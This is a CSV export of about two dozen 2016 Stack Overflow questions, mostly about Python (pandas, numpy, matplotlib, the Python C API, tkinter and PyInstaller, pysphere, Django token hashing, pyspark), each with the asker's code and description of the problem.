Id,OwnerUserId,CreationDate,Score,Title,Body
39846207,5846679.0,2016-10-04 07:09:06+00:00,2,Check for duplicates in a randomly generated list and replace them,"<p>I am making a minesweeper game with randomly generated bombs. Yet at times I have found that there are duplicates in my list of coordinates of bombs. How do I check for duplicates in a list and replace them with other randomised coordinates.</p>

<pre><code>from random import randint

def create_bombpos():
    global BOMBS, NUM_BOMBS, GRID_TILES
    for i in range(0, NUM_BOMBS):
        x = randint(1, GRID_TILES)
        y = randint(1, GRID_TILES)
        BOMBS.append((x, y))
    print(BOMBS)
</code></pre>

<p>The user can decide how big the board is by input of <code>GRID_TILES</code>.
If they input 5, the board will be 5x5. The ammount of bombs is: </p>

<pre><code>GRID_TILES * GRIDTILES / 5
</code></pre>
"
39948485,1514983.0,2016-10-09 21:00:18+00:00,2,How can I convert Python boolean object to C int (or C++ boolean) (Python C API),"<p>I have a variable <code>PyObject</code> that I know is a Python bool. It either is <code>True</code> or <code>False</code> (eg. <code>Py_True</code> or <code>Py_False</code>). Now I would like to convert it to C++ somehow.</p>

<p>Doing this with strings isn't so hard, there is a helper function for that - <code>PyBytes_AsString</code> that converts python string into C string. Now I need something like that for boolean (or int as there is no <code>bool</code> in C).</p>

<p>Or if there isn't conversion, maybe some function that can compare with true or false? Something like <code>int PyBool_IsTrue(PyObject*)</code>?</p>

<p>Here is some example code for easier understanding of what I need:</p>

<pre><code>#include &lt;Python.h&gt;

int main()
{
    /* here I create Python boolean with value of True */
    PyObject *b = Py_RETURN_TRUE;
    /* now that I have it I would like to turn in into C type so that I can determine if it's True or False */
    /* something like */
    if (PyBool_IsTrue(b))
    { /* it's true! */ }
    else
    { /* it's false */ }
    return 0;
}
</code></pre>

<p>This obviously wouldn't work as there is no such function like <code>PyBool_IsTrue</code> :( how can I do that?</p>

<p>Snippet of Python header (boolobject.h):</p>

<pre><code>/* Boolean object interface */

#ifndef Py_BOOLOBJECT_H
#define Py_BOOLOBJECT_H
#ifdef __cplusplus
extern ""C"" {
#endif


PyAPI_DATA(PyTypeObject) PyBool_Type;

#define PyBool_Check(x) (Py_TYPE(x) == &amp;PyBool_Type)

/* Py_False and Py_True are the only two bools in existence.
Don't forget to apply Py_INCREF() when returning either!!! */

/* Don't use these directly */
PyAPI_DATA(struct _longobject) _Py_FalseStruct, _Py_TrueStruct;

/* Use these macros */
#define Py_False ((PyObject *) &amp;_Py_FalseStruct)
#define Py_True ((PyObject *) &amp;_Py_TrueStruct)

/* Macros for returning Py_True or Py_False, respectively */
#define Py_RETURN_TRUE return Py_INCREF(Py_True), Py_True
#define Py_RETURN_FALSE return Py_INCREF(Py_False), Py_False

/* Function to return a bool from a C long */
PyAPI_FUNC(PyObject *) PyBool_FromLong(long);

#ifdef __cplusplus
}
#endif
#endif /* !Py_BOOLOBJECT_H */
</code></pre>
"
39853311,1762211.0,2016-10-04 13:12:07+00:00,2,Explode a row to multiple rows in pandas dataframe,"<p>I have a dataframe with the following header: </p>

<pre><code>id, type1, ..., type10, location1, ..., location10
</code></pre>

<p>and I want to convert it as follows: </p>

<pre><code>id, type, location 
</code></pre>

<p>I managed to do this using embedded for loops but it's very slow: </p>

<pre><code>new_format_columns = ['ID', 'type', 'location'] 
new_format_dataframe = pd.DataFrame(columns=new_format_columns)



print(data.head())
new_index = 0 
for index, row in data.iterrows(): 
        ID = row[""ID""]

        for i in range(1,11):
                if row[""type""+str(i)] == np.nan:
                        continue
                else:
                        new_row = pd.Series([ID, row[""type""+str(i)], row[""location""+str(i)]])
                        new_format_dataframe.loc[new_index] = new_row.values
                        new_index += 1
</code></pre>

<p>Any suggestions for improvement using native pandas features? </p>
"
39853781,3074293.0,2016-10-04 13:34:58+00:00,2,How to set the size of tick label superscripts in matplotlib rcParams,"<p>I'm generating some <code>.eps</code> files for a publication, and I need to manually set the font size of the the tick labels and their supercripts separately. The following code generates a figure where the exponent is too small for the final printed version.</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt
from matplotlib import rcParams

rcParams['ytick.labelsize'] = 14

plt.semilogy(np.abs(np.random.randn(100)))
plt.savefig('foo.eps')
</code></pre>

<p><a href=""http://i.stack.imgur.com/3RUpE.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/3RUpE.png"" alt=""enter image description here""></a></p>

<p>If I go into the output file and replace every line <code>9.799999999999999 scalefont</code> with <code>14.0 scalefont</code>, I get the following.</p>

<p><a href=""http://i.stack.imgur.com/y9p6R.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/y9p6R.png"" alt=""enter image description here""></a></p>

<p>This is fine for now (I'm already processing the output files as part of the generating script), but I wonder if there's an <code>rcParam</code> entry that I can modify so that I don't need to directly muck around with the <code>eps</code> file as much. </p>
"
39862662,336527.0,2016-10-04 22:21:52+00:00,2,Differences in __dict__ between classes with and without an explicit base class,"<p>Why does a class that (implicitly) derives from <code>object</code> have more items in its <code>__dict__</code> attribute than a class that has an explicit base class? (python 3.5).</p>

<pre><code>class X:
    pass
class Y(X):
    pass
X.__dict__
'''
mappingproxy({'__dict__': &lt;attribute '__dict__' of 'X' objects&gt;,
              '__doc__': None,
              '__module__': '__main__',
              '__weakref__': &lt;attribute '__weakref__' of 'X' objects&gt;})
'''

Y.__dict__
'''
mappingproxy({'__doc__': None, '__module__': '__main__'})
'''
</code></pre>
"
39941174,6944020.0,2016-10-09 07:38:30+00:00,2,fast Python IPv6 compaction,"<p>I'm trying to write some code that can quickly return a properly compacted IPv6 address. I've tried...</p>

<pre><code>socket.inet_pton(socket.AF_INET6,socket.inet_PTON(socket.AF_INET6,address))
ipaddress.IPv6Address(address)
IPy.IP(address)
</code></pre>

<p>...listed from faster to slower in their speed of handling IPv6 compaction. The first is the fastest (~3.6 seconds per 65,565 IP addresses), the second is less than half as fast as the first (~8.4 seconds per 65,565 IP addresses), the last one is almost twice as slow as the second (~14.4 seconds per 65,565 IP addresses).</p>

<p>So, I set out to create my own...</p>

<pre><code>import re
from ipaddress import IPv6Address

IPaddlist = [
    '2001:db8:00:0:0:0:cafe:1111',
    '2001:db8::a:1:2:3:4',
    '2001:0DB8:AAAA:0000:0000:0000:0000:000C',
    '2001:db8::1:0:0:0:4',
    '2001:4958:5555::4b3:ffff',
  ]

for addr in IPaddlist:
  address = "":"".join('' if i=='0000' else i.lstrip('0') for i in addr.split(':'))
  address2 = (re.sub(r'(:)\1+', r'\1\1', address).lower())
  print(address2)
  print(IPv6Address(addr))
  print('\n')
</code></pre>

<p>It returns:</p>

<pre><code>2001:db8::cafe:1111
2001:db8::cafe:1111

2001:db8::a:1:2:3:4
2001:db8:0:a:1:2:3:4

2001:db8:aaaa::c
2001:db8:aaaa::c

2001:db8::1::4
2001:db8:0:1::4

2001:4958:5555::4b3:ffff
2001:4958:5555::4b3:ffff
</code></pre>

<p>The first line of each entry is my code, the second is the correct compaction, using ipaddress.IPv6Address.</p>

<p>As you can see, I'm close, but you know what they say about 'close'...</p>

<p>Anyone have any pointers? I seem to have hit a roadblock.</p>
"
39861662,4680896.0,2016-10-04 21:00:47+00:00,2,Testing pull-request on other person's package,"<p>I opened an <a href=""https://github.com/mvantellingen/python-zeep/issues/177"" rel=""nofollow"">issue</a> in a package that I need for my job, and now the author is asking me to test a <a href=""https://github.com/mvantellingen/python-zeep/pull/205"" rel=""nofollow"">pull request</a>. The problem is... I don't really know what is the preferred way to do that.  </p>

<p>The only way I see now is that I fork the repository, download and apply the pull request as a patch and then import the function from that project... surely there must be a better way? I'm using PyCharm on Ubuntu.</p>
"
39861685,356729.0,2016-10-04 21:02:28+00:00,2,Does dask distributed use Tornado coroutines for workers tasks?,"<p>I've read at the dask <a href=""http://distributed.readthedocs.io/en/latest/foundations.html#concurrency-with-tornado-coroutines"" rel=""nofollow""><code>distributed</code> documentation</a> that:</p>

<blockquote>
  <p>Worker and Scheduler nodes operate concurrently. They serve several
  overlapping requests and perform several overlapping computations at
  the same time without blocking.</p>
</blockquote>

<p>I've always thought single-thread concurrent programming is best suited for I/O expensive, not CPU-bound jobs. However I expect many dask tasks (e.g. <code>dask.pandas</code>, <code>dask.array</code>) to be CPU intensive.</p>

<p>Does distributed only use Tornado for client/server communication, with separate processes/threads to run the dask tasks? Actually <code>dask-worker</code> has <code>--nprocs</code> and <code>--nthreads</code> arguments so I expect this to be the case.</p>

<p>How do concurrency with Tornado coroutines and more common processes/threads processing each dask task live together in distributed?</p>
"
39861960,6412942.0,2016-10-04 21:20:58+00:00,2,Do we need to specify python interpreter externally if python script contains #!/usr/bin/python3?,"<p>I am trying to invoke python script from C application using <code>system()</code> call</p>

<p>The python script has <code>#!/usr/bin/python3</code> on the first line.</p>

<p>If I do <code>system(python_script)</code>, the script does not seem to run.</p>

<p>It seems I need to do <code>system(/usr/bin/python3 python_script)</code>.</p>

<p>I thought I do not need to specify the interpreter externally if I have <code>#!/usr/bin/python3</code> in the first line of the script.</p>

<p>Am I doing something wrong?</p>
"
39939773,6806349.0,2016-10-09 03:37:29+00:00,2,How to get a numpy ndarray of integers from a file with header?,"<p>I have a plain text file (.txt) with the following content.</p>

<pre><code>Matrix Header.
6 11
0 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 0 1 1 1 1 
1 1 1 1 0 0 1 1 1 1 1 
0 0 0 0 1 1 1 0 0 0 0 
1 1 1 0 0 1 1 1 1 1 1 
1 0 0 1 1 1 1 0 1 1 0 

 6 rows,  11 columns
</code></pre>

<p>I need obtain a numpy ndarray of integers as below:</p>

<pre><code>[[0 1 1 1 1 1 1 1 1 1 1] 
 [1 0 1 1 1 1 0 1 1 1 1] 
 [1 1 1 1 0 0 1 1 1 1 1] 
 [0 0 0 0 1 1 1 0 0 0 0] 
 [1 1 1 0 0 1 1 1 1 1 1] 
 [1 0 0 1 1 1 1 0 1 1 0]]
</code></pre>

<p>I tried the following strategy</p>

<pre><code>import pandas
import numpy
data = pandas.read_table(path, skiprows= 2)
data = data.values
print(data)
</code></pre>

<p>But the resulting ndarray isn't in the correct format.</p>

<pre><code>[['0 1 1 1 1 1 1 1 1 1 1 '] 
 ['1 0 1 1 1 1 0 1 1 1 1 '] 
 ['1 1 1 1 0 0 1 1 1 1 1 '] 
 ['0 0 0 0 1 1 1 0 0 0 0 '] 
 ['1 1 1 0 0 1 1 1 1 1 1 '] 
 ['1 0 0 1 1 1 1 0 1 1 0 ']]
</code></pre>

<p>Can anybody help me?</p>
"
39862573,6918302.0,2016-10-04 22:12:47+00:00,2,How to redirect stdout to screen and at the same time save to a variable,"<p>I am trying to redirect stdout to screen and at the same time save to a variable and running into error <code>AttributeError: __exit__</code> at line <code>with proc.stdout:</code>,can anyone tell me how to accomplish this?</p>

<pre><code>...............
proc = subprocess.Popen(cmd.split(' '), stderr=subprocess.PIPE)
try:
    proc.wait(timeout=time_out) 
except TimeoutExpired as e:
    print e
    proc.kill()
with proc.stdout:
    for line in proc.stdout:
        print line
</code></pre>

<p>Error:-</p>

<pre><code>    with proc.stdout:
AttributeError: __exit__
</code></pre>

<p><strong>UPDATE:-</strong></p>

<pre><code>proc = subprocess.Popen(cmd.split(' '),stdout=subprocess.PIPE )
print ""Executing %s""%cmd
try:
    proc.wait(timeout=time_out)//HUNG here until timeout kicks-in
except TimeoutExpired as e:
    print e
    proc.kill()
with proc.stdout as stdout:
    for line in stdout:
        print line,
</code></pre>
"
39938890,4957623.0,2016-10-09 00:52:19+00:00,2,get TypeError when i import my own .py file,"<p>I am doing a sort program.i have two files called bubble(a bubble sort program) and cal_time(calculate the time),and they are in the same directory.</p>

<p>The problem is ,bubble work alone fluently.   however,when i import bubble to my cal_time file and callback bubble sort,the interpreter show me the error message,and obviously there is no built_in function or method in my code:</p>

<blockquote>
<pre><code>Traceback (most recent call last):    
  File ""F:/alogrithm/wzysort/cal_time.py"", line 13, in &lt;module&gt;  
      bubble.bubble_sort(generate_random_list())  
  File ""F:\alogrithm\wzysort\bubble.py"", line 4, in bubble_sort  
       if a[indx] &gt; a[indx+1]:  
    TypeError: unorderable types: builtin_function_or_method() &gt; builtin_function_or_method()
</code></pre>
</blockquote>

<p>cal_time.py:</p>

<pre><code>import time
from wzysort import bubble
import random


def generate_random_list():
    result = []
    for i in range(10):
        result.append(random.random)
    return result

time_start = time.time()
bubble.bubble_sort(generate_random_list())
time_end = time.time()
print(time_end - time_start)
</code></pre>

<p>bubble.py:</p>

<pre><code>def bubble_sort(a):
for i in range(len(a)-1):
    for indx in range(len(a[:-i-1])):
        if a[indx] &gt; a[indx+1]:
            a[indx], a[indx + 1] = a[indx + 1], a[indx]
</code></pre>
"
39854373,3581217.0,2016-10-04 14:02:34+00:00,2,Pandas time series comparison with missing data/records,"<p>This question is somewhat related to an earlier question from me (<a href=""http://stackoverflow.com/questions/38658811/remapping-numpy-array-with-missing-values"">Remapping `numpy.array` with missing values</a>), where I was struggling with time series with missing data, and someone suggested <em>""use Pandas!""</em>. So here I go...</p>

<p>I'm dealing with large data sets, basically consisting of time series from different observation sites, where I would like to statistically compare the sites. These data sets are quite messy; lots of missing data (indicated with e.g. <code>-99</code>), missing time records (one station might have the time record, another not), and I only want to include/compare data where either (1) all sites have data for a certain variable, or (2) the two sites I would like to compare have data for that variable, ignoring whether the other sites (don't) have data. </p>

<p>Take this minimal example:</p>

<pre><code>import pandas as pd
from io import StringIO

data = StringIO(""""""\
  1,  2001-01-01, 00:00, 1.0, 0.5, 1.0
  1,  2001-01-01, 01:00, 1.1, 0.6, 2.0
  1,  2001-01-01, 02:00, 1.2, 0.7, 3.0
  1,  2001-01-01, 03:00, 1.3, 0.8, 4.0

  2,  2001-01-01, 00:00, 2.0, -99, -99
  2,  2001-01-01, 01:00, -99, 1.6, 2.0
  2,  2001-01-01, 02:00, 2.2, 1.7, 3.0
  2,  2001-01-01, 03:00, 2.3, 1.8, 4.0

  3,  2001-01-01, 00:00, 3.0, 2.5, 1.0
  3,  2001-01-01, 01:00, 3.1, 2.6, -99
  3,  2001-01-01, 02:00, -99, -99, 3.0
  3,  2001-01-01, 03:00, 3.3, 2.8, 4.0
  3,  2001-01-01, 04:00, 3.4, 2.9, 5.0
"""""")

columns = ['id','date','time','T','Td','cc']
df = pd.read_table(data, header=None, names=columns, delimiter=',', na_values=-99, parse_dates=[['date','time']])
</code></pre>

<p>Where <code>-99</code> indicates a missing value. I would like to compare the data (columns <code>T</code>,<code>Td</code>,<code>cc</code>) from different sites (column <code>id</code>), but as mentioned, only if either two or all <code>id</code>'s have data for the variable I'm interested in (completely ignoring whether the data in other columns is missing).</p>

<p>So for this example, if all sites need to have data, comparing <code>T</code> would only result in comparing data from <code>2001-01-01, 00:00</code> and <code>03:00</code>, since for the other times, either <code>id=2</code> or <code>id=3</code> is missing <code>T</code>, and the last time record for <code>id=3</code> is completely absent in the other <code>id</code>'s. </p>

<p>I've been playing with this for hours now, but honestly I don't really know where to start. Is it possible to extract a <code>numpy.array</code>, using the criteria outlined above, of size <code>n_sites x n_valid_values</code> (<code>3x2</code>, for this example), which I could then use for further analysis?</p>

<p><em>EDIT</em> As a partial, but really (<em>really</em>) ugly solution, something like this seems to work:</p>

<pre><code># Loop over all indexes where T is nan:
for i in np.where(df['T'].isnull())[0]:
    # For each of them, set records with the same date_time to nan
    j = np.where(df['date_time'] == df['date_time'][i])[0]
    df['T'][j] = np.nan
# Drop all records where T is nan
df2 = df.dropna(subset=['T'])

# Group by the different stations:
g = df2.groupby('id')

# Get the arrays (could automate this based on the unique id's):
v1 = g.get_group(1)['T']
v2 = g.get_group(2)['T']
v3 = g.get_group(3)['T']
</code></pre>

<p>But this still doesn't drop the record for <code>id=3</code>, <code>date_time=2001-01-01, 04:00</code>, and I guess/hope that there are more elegant methods with <code>Pandas</code>.</p>
"
39938862,6943139.0,2016-10-09 00:45:42+00:00,2,Lines in a file is not displayed (python),"<p>I'm a python beginner. So I encountered this problem. The file has 100 songs, each song with an id(X), title(T), time sig(M) and key sig(K),
the format of the text file is the same throughout the file. 
However it skipped 8 lines. Some of the tunes in the file has several titles, but only one is to be displayed </p>

<pre><code>file = open(""musicFile.abc"", ""r"")
idNum = """"
title = """"
timesig = """"
keysig = """"
total = 0
for line in file:
    if line[0] == 'X':
        idNum = line[2:]
    elif line[0] == 'T':
        sep = ','  
        line = line.split(sep, 1)[0]   
        title = line[2:]
        for i in range(4):
            if next(file) == 'T': 
            break
    elif line[0] == 'M':
        timesig = line[2:]
    elif line[0] == 'K':
        keysig = line[2:]
        fullLine = ""Id: "" + idNum + "" .... "" + ""Title: "" + title + "" .... "" + \
        ""Time sig: "" + timesig + "" .... "" + ""Key sig: "" + keysig
    fullLine = fullLine.replace(""\n"", """") 
    print(fullLine)
    total += 1

print(""\n-------------------------------"")
print(""There are "", total, ""tunes in the file"")
print(""-------------------------------"")
</code></pre>

<p>This is the compiled result:
<a href=""http://i.stack.imgur.com/4AEJp.png"" rel=""nofollow"">compiled program</a></p>

<p>It should display there are 100 tunes in the file.</p>
"
39863989,1672315.0,2016-10-05 01:12:57+00:00,2,create sub lists by grouping with conditional check on two consecutive zeros,"<p>I have a list:</p>

<pre><code>lst = [0, -7, 0, 0, -8, 0, 0, -4, 0, 0, 0, -6, 0, -4, -29, -10, 0, -16, 0, 0, 2, 3, 0, 18, -1, -2, 0, 0, 0, 0, 0, 0, 21, 10, -10, 0, -12, 3, -5, -10]
</code></pre>

<p>I want to create group of sublists with conditional break when a value is followed by two consecutive zeros.</p>

<p>so my intermediate list would like </p>

<pre><code>newlst = [-7,-8,-4,[-6,-4,-29,-10,-16],[2,3,18,-1,-2],[21,10,-10,-12,3,-5,-10]]
</code></pre>

<p>whereas the final output will be sum of sublists:</p>

<pre><code>[-7,-8,-4,-65,18,-3]
</code></pre>

<p>I tried using the index number in a for loop with enumerate but i'm not getting my desired output.</p>
"
39864184,5590599.0,2016-10-05 01:38:59+00:00,2,Renaming python.exe to python3.exe for co-existence with python2 on Windows,"<p>I would like to install both python 2.7 and python 3.5 on my Windows 10 PC. Both python executables use the same name <code>python.exe</code>.</p>

<p>Is it a good idea to change <code>python.exe</code> to <code>python3.exe</code> as a quick fix for co-existence? Are there any side-effects or other things that I need to be aware?</p>
"
39866976,1577947.0,2016-10-05 06:37:14+00:00,2,Python PyInstaller Tkinter Button Tied to Messagebox Does Nothing,"<p>I have a tiny button with a question mark in my app. When clicked, it displays the doc string from a function in my app which helps to explain what the app does.</p>

<p>The problem is, I build a single .exe using pyinstaller and this question mark button does nothing when clicked.</p>

<p><strong>Recreation Steps</strong></p>

<ol>
<li>save the file below as run.py</li>
<li>open command-prompt</li>
<li>paste <code>pyinstaller.exe --onefile --windowed run.py</code></li>
<li>go to <code>dist</code> folder and run single exe</li>
<li>click <code>?</code> button and notice it does nothing</li>
</ol>

<p>run.py below</p>

<pre><code>import tkinter as tk
from tkinter import ttk

''' pyinstaller.exe --onefile --windowed run.py '''

def someotherfunction():
  '''
  This is some message that I
  want to appear but it currently doesn\'t
  seem to work

  when I put try to launch a messagebox
  showinfo window...
  '''
  pass

def showhelpwindow():
  return tk.messagebox.showinfo(title='How to use this tool',
                         message=someotherfunction.__doc__)

root = tk.Tk()
helpbutton = ttk.Button(root, text='?', command=showhelpwindow, width=2)
helpbutton.grid(row=0, column=3, sticky='e')
root.mainloop()
</code></pre>

<p>My setup:</p>

<ul>
<li>PyInstaller 3.2</li>
<li>Windows 7</li>
<li>Python 3.4.2</li>
</ul>

<p>I tried adding <a href=""http://stackoverflow.com/questions/28349359/pyinstaller-single-file-executable-doesnt-run""><code>--noupx</code></a> option but that didn't fix it.</p>

<p>EDIT:</p>

<p>I removed <code>--windowed</code> option this time and the console is now showing me an error when I click this button.</p>

<pre><code>Exception in Tkinter callback
Traceback (most recent call last):
  File ""tkinter\__init__.py"", line 1533, in __call__
  File ""run.py"", line 156, in showhelpwindow
AttributeError: 'module' object has no attribute 'messagebox'
</code></pre>
"
39936967,6942433.0,2016-10-08 20:19:48+00:00,2,Feature detection for embedded platform OpenCV,"<p>I'm trying to do object recognition in an embedded environment, and for this I'm using Raspberry Pi (Specifically version 2).</p>

<p>I'm using OpenCV Library and as of now I'm using feature detection algorithms contained in OpenCV.</p>

<p>So far I've tried different approaches:</p>

<ul>
<li>I tried different keypoint extraction and description algorithms: SIFT, SURF, ORB. SIFT and SURF are too heavy and ORB is not so good.</li>
<li>Then I tried using different algorithms for keypoint extraction and then description. The first approach was to use FAST algorithm to extract key points and then ORB or SURF for description, the results were not good and not rotation invariant, then i tried mixing the others.</li>
</ul>

<p>I now am to the point where I get the best results time permitting using ORB for keypoint extraction and SURF for description. But it is still really slow.</p>

<p>So do you have any suggestions or new ideas to obtain better results? Am I missing something?</p>

<p>As additional information, I'm using Python 3.5 with OpenCV 3.1   </p>
"
39936344,5807606.0,2016-10-08 19:12:10+00:00,2,Permutations of 2 characters in Python into fixed length string with equal numbers of each character,"<p>I've looked through the 2 questions below, which seem closest to what I am asking, but don't get me to the answer to my question.</p>

<p><a href=""http://stackoverflow.com/questions/36517439/permutation-of-x-length-of-2-characters"">Permutation of x length of 2 characters</a></p>

<p><a href=""http://stackoverflow.com/questions/104420/how-to-generate-all-permutations-of-a-list-in-python"">How to generate all permutations of a list in Python</a></p>

<p>I am trying to find a way to take 2 characters, say 'A' and 'B', and find all unique permutations of those characters into a 40 character string. Additionally - I need each character to be represented 20 times in the string. So all resulting strings each have 20 'A's and 20 'B's.</p>

<p>Like this:</p>

<pre><code>'AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB'
'AAAAAAAAAAAAAAAAAAABABBBBBBBBBBBBBBBBBBB'
'AAAAAAAAAAAAAAAAAABAABBBBBBBBBBBBBBBBBBB'
</code></pre>

<p>etc...</p>

<p>All I really need is the count of unique combinations that follow these rules. </p>

<pre><code>y=['A','A','A','A','B','B','B','B']
comb = set(itertools.permutations(y))
print(""Combinations Found: {:,}"".format(len(comb)))
</code></pre>

<p>This works, but it doesn't scale well to an input string of 20 'A's and 20 'B's. The above code takes 90 seconds to execute. Even just scaling up to 10 'A's and 10 'B's ran for 20 minutes before I killed it.</p>

<p>Is there more efficient way to approach this given the parameters I've described?</p>
"
39943765,6941106.0,2016-10-09 12:42:49+00:00,2,Remove Quotation marks from a dictionary,"<p>I have a dictionary of bigrams, obtained by importing a csv and transforming it to a dictionary:</p>

<pre><code>bigram_dict = {""('key1', 'key2')"": 'meaning', ""('key22', 'key13')"": 'mean2'}
</code></pre>

<p>I want keys' dictionary to be without quotation marks, i.e.:</p>

<pre><code>desired_bigram_dict={('key1', 'key2'): 'meaning', ('key22', 'key13'): 'mean2'}
</code></pre>

<p>Would you please suggest me how to do this?</p>
"
39943895,4960855.0,2016-10-09 12:58:44+00:00,2,pysphere PerformanceManager fails to get statistics of datastores,"<p>I'm trying to get statistics of vsphere datastores.</p>

<p>While I'm able to get statistics of hosts, it fails with datastores:</p>

<pre><code>from pysphere import VIServer 

server = VIServer() 
server.connect(HOST, USER, PASSWORD) 

pm = server.get_performance_manager() 

# querying hosts - works:
entities = server.get_hosts()  # returns {entity: name}
counters = pm.get_entity_counters(entities.keys()[0])  # returns {name: id}
statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])

# querying datastores - doesn't work:
entities = server.get_datastores()  # returns {entity: name}
counters = pm.get_entity_counters(entities.keys()[0])  # returns {name: id}
statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])
</code></pre>

<p>The last line raises the following error:</p>

<pre><code>AttributeError                            Traceback (most recent call last)
&lt;ipython-input-122-dbbb39ef8a75&gt; in &lt;module&gt;()
----&gt; 1 statistics = pm.get_entity_statistic(entities.keys()[0], counters.values()[:1])

.../python2.7/site-packages/pysphere/vi_performance_manager.pyc in get_entity_statistic(self, entity, counters, interval, composite)
    183 
    184             instance_name = str(stat.Id.Instance)
--&gt; 185             stat_value = str(stat.Value[0])
    186             date_now = datetime.datetime.utcnow()
    187             statistics.append(EntityStatistics(entity, stat.Id.CounterId, cname,

.../python2.7/site-packages/pysphere/ZSI/generate/pyclass.pyc in get(self)
    146         if not callable(what):
    147             def get(self):
--&gt; 148                 return getattr(self, what.aname)
    149 
    150             if what.maxOccurs &gt; 1:

AttributeError: 'DynamicData_Holder' object has no attribute '_value'
</code></pre>

<p>It seems the pysphere repository has been inactive for around 3 years now, and I couldn't find discussions mentioning this specific issue except for this:
<a href=""https://groups.google.com/forum/#!topic/pysphere/LQaF661msoQ"" rel=""nofollow"">https://groups.google.com/forum/#!topic/pysphere/LQaF661msoQ</a></p>

<p>Unfortunately this solution doesn't cover the desired statistics but only simple stats of the current moment.</p>

<p>I also found a similar error reported, but it wasn't really addressed as far as I understand:
<a href=""https://github.com/itnihao/pysphere/issues/60"" rel=""nofollow"">https://github.com/itnihao/pysphere/issues/60</a></p>

<p>Any help would be greatly appreciated.</p>
"
39858364,5936342.0,2016-10-04 17:28:12+00:00,2,Stored salted token and token comparison,"<p>I'm generating an url composed of a single use token, and sending it to a user by e-mail. The user should click this link and be redirected to a page which will validate the token and do some actions. </p>

<p>On the database side, I'm storing this token (hashed and salted, for security reasons). The problem is I'm having some difficulties to validate the the token because, the way I'm storing it, I cannot generate the same salt for the same token. And, therefore, I cannot compare this salt with the ones I have stored.</p>

<pre><code># Retrieving or creating object usertokens
usr, created = UserToken.objects.get_or_create(email=email)
# Adding a new token
token = uuid.uuid4().hex
usr.token = make_password(token) # Stores in the local database the salted and hashed token
usr.save()
</code></pre>

<p>This make_password method I'm using is defined in <code>django.contrib.auth.hashers</code>.</p>

<p>By using this method, I cannot generate two times the same salt from the same token.</p>

<pre><code>&gt;&gt;&gt; token = 'test'
&gt;&gt;&gt; enc_token1 = make_password(token)
&gt;&gt;&gt; enc_token2 = make_password(token)
&gt;&gt;&gt; enc_token1 == enc_token2
False
</code></pre>

<p>This, however, does not help me to retrieve from my database the entry corresponding to the token and I cannot validate it.</p>
"
39944494,3628460.0,2016-10-09 14:08:18+00:00,2,Render italic text in pygame,"<p>I want to write italic text with pygame. The pygame.font documentation says that one shouldn't use set_italic() and rather load a true italic font. I checked the fonts available to pygame and there weren't any that said ""italic"" in the name or anything. So I was wondering how I can find out what fonts I use for writing italic text or load them, because I don't know how they're called.</p>
"
39858238,6505286.0,2016-10-04 17:20:43+00:00,2,How can i save RDD to a single parquet file?,"<p>I work with pyspark 2.0, hadoop 2.7.2.
And here is my code:</p>

<pre><code>def func(df):
    new_df = pd.DataFrame(df['id'])
    new_df['num'] = new_df['num'] * 12
    return new_df

set = sqlContext.read.parquet(""data_set.parquet"")
columns = set.columns
map_res = set.rdd.mapPartitions(lambda iter_: func(pd.DataFrame(list(iter_), 
                                                   columns=columns)))
</code></pre>

<p>Now, I need to save <strong>map_res</strong> RDD as a parquet file <em>new.parquet</em>. 
Is there any way i can do it without creating a large dataframe before the saving? Or may be there is a possibility of saving each partition of RDD separately and then merge all saved files?</p>

<p>P.s. I want to manage without creating a dataframe due to its realy large size.</p>
"
